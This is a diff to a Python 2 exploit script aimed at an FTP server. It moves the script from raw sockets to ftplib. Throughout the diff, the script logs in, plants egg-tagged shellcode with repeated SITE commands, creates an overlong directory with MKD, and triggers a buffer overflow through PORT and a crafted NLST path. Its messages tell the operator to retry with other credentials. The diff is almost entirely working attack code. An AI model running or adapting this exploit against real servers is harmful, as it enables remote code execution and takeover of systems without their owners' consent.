@@ -111,13 +111,14 @@ def random_hex_string(size=4, chars=string.ascii_uppercase):
     #return hex_string
     return ascii_string
 
-def drop_shellcode(sock, shellcode, egg):
+def drop_shellcode(ftp_server, shellcode, egg):
     encoded_shellcode = shellcode.replace("\xff", "\xff\xff")
     i = 0
     while i < 5:
-        data = sock.send("SITE " + egg + encoded_shellcode)
+        #data = sock.send("SITE " + egg + encoded_shellcode)
         #data = sock.recv(1024)
-        print data
+        #print data
+        ftp_server.sendcmd("SITE " + egg + encoded_shellcode)
         i = i+1
 
 def build_directory_buffer(egg,patch,ret):
@@ -153,9 +154,9 @@ def main():
     
     #create socket
     try:
-        ftp = FTP()
+        ftp_server = FTP()
         print "[+] Connecting to FTP Server: %s on port %d" % (ip, port)
-        ftp.connect(ip,port,timeout=30)        
+        ftp_server.connect(ip,port,timeout=30)        
         #sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         #sock.settimeout(30)
         #sock.connect((ip,port))
@@ -174,7 +175,7 @@ def main():
     #Attempt logon to FTP server
     print "[+] Attemping FTP Logon with creds: %s / %s" %(ftp_user, ftp_pass)
     try:
-        ftp.login(user=ftp_user, passwd=ftp_pass)
+        ftp_server.login(user=ftp_user, passwd=ftp_pass)
         print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
     except:
         "[!] Invalid FTP Credentials. If using default credentials please try again specifying valid credentials.  Exiting..."
@@ -208,15 +209,22 @@ def main():
     print "[+] Using %s as location for shellcode" % string2hex(egg)
     #drop shellcode onto stack
     print "[+] Dropping shellcode onto stack."
-    drop_shellcode(sock, shellcode, egg)
+    drop_shellcode(ftp_server, shellcode, egg)
     print "[+] Building attack buffer for directory name"
     d_buffer = build_directory_buffer(egg, patch, ret)
     
     #send overflow directory buffer
     print "[+] Creating long directory..."
-    data = sock.send("MKD "+ d_buffer)
+    try:
+        ftp_server.mkd(d_buffer)
+    except:
+        print "[!] Unexpected response from FTP Server."
+        print "[!] Most likely cause is that the user does not have write permissions to FTP root directory."
+        print "[!] You should retry the exploit with different credentials if they are available."
+        print "[!] Exiting..."
+        sys.exit(-1)
     #data = sock.recv(1024)
-    print data
+    #print data
     #if str(data).startswith("257"):
     #    print "[+] Directory Successfuly Created!"
     #else:
@@ -234,9 +242,10 @@ def main():
     #build address for PORT command
     srv_address = "%s,%s,%s" % (srv_info[0].replace(".",","), srv_port1, srv_port2)
     #send PORT command
-    sock.send("PORT %s" % srv_address)
+    ftp_server.sendcmd("PORT %s" % srv_address)
     
     #trigger vulnerability
-    sock.send("NLST %s*/../%s*/" % (d_buffer, pre))
+    dir_name = " %s*/../%s*/" % (d_buffer, pre)
+    ftp_server.nlst(dir_name)
         
 main()
